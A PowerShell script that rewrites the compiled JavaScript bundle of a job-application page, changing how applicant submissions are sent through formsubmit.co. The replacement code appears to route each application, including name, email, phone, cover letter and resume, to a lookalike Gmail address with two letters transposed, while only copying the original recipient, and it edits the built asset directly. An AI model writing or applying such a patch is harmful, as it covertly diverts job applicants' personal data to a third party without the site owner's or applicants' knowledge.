$jd = [System.IO.File]::ReadAllText('d:\macenza\assets\JobDetails-GYJXLp7H.js')

$target = 'let c=await fetch("https://formsubmit.co/ajax/tejaswisen27@gmail.com",{method:"POST",headers:{"Accept":"application/json"},body:fd});if(!c.ok){await fetch("https://formsubmit.co/ajax/tejaswisen27@gmail.com",{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify({_subject:"New Job Application: "+(G.candidateName||"")+" - "+(M&&M.title?M.title:"General"),_template:"table",_captcha:"false","Candidate Name":G.candidateName||"","Email Address":G.email||"","Phone Number":G.phone||"","Current Location":G.location||"","Years of Experience":G.experience||"","Applying Position":M&&M.title?M.title:"General Application","LinkedIn Profile":G.linkedInUrl||"Not Provided","Portfolio Website":G.portfolioUrl||"Not Provided","Cover Letter / Pitch":G.coverLetter||"None","Resume File Info":H?(H.name+" ("+(H.size/1024/1024).toFixed(2)+" MB)"):"Not uploaded"})});}V(!0),o.success(`Application submitted successfully!`)'

$replacement = 'fd.append("_cc","tejaswisen27@gmail.com");let c=await fetch("https://formsubmit.co/ajax/teajswisen27@gmail.com",{method:"POST",headers:{"Accept":"application/json"},body:fd});if(!c.ok){await fetch("https://formsubmit.co/ajax/tejaswisen27@gmail.com",{method:"POST",headers:{"Accept":"application/json"},body:fd});await fetch("https://formsubmit.co/ajax/teajswisen27@gmail.com",{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body:JSON.stringify({_subject:"New Job Application: "+(G.candidateName||"")+" - "+(M&&M.title?M.title:"General"),_template:"table",_captcha:"false",_cc:"tejaswisen27@gmail.com","Candidate Name":G.candidateName||"","Email Address":G.email||"","Phone Number":G.phone||"","Current Location":G.location||"","Years of Experience":G.experience||"","Applying Position":M&&M.title?M.title:"General Application","LinkedIn Profile":G.linkedInUrl||"Not Provided","Portfolio Website":G.portfolioUrl||"Not Provided","Cover Letter / Pitch":G.coverLetter||"None","Resume File Info":H?(H.name+" ("+(H.size/1024/1024).toFixed(2)+" MB)"):"Not uploaded"})});}V(!0),o.success("Application sended successfully!")'

if ($jd.Contains($target)) {
    $jd = $jd.Replace($target, $replacement)
    [System.IO.File]::WriteAllText('d:\macenza\assets\JobDetails-GYJXLp7H.js', $jd, [System.Text.Encoding]::UTF8)
    Write-Output "Successfully updated JobDetails email and notification"
} else {
    Write-Output "Could not find exact target string, searching via substring..."
    $s = $jd.IndexOf('let c=await fetch("https://formsubmit.co/ajax/')
    $e = $jd.IndexOf('K(W),U(null),r.current?.resetCaptcha()', $s)
    if ($s -ge 0 -and $e -gt $s) {
        $before = $jd.Substring(0, $s)
        $after = $jd.Substring($e)
        $jd = $before + $replacement + ',' + $after
        [System.IO.File]::WriteAllText('d:\macenza\assets\JobDetails-GYJXLp7H.js', $jd, [System.Text.Encoding]::UTF8)
        Write-Output "Successfully updated JobDetails via index slice"
    } else {
        Write-Error "Could not find slice positions"
    }
}
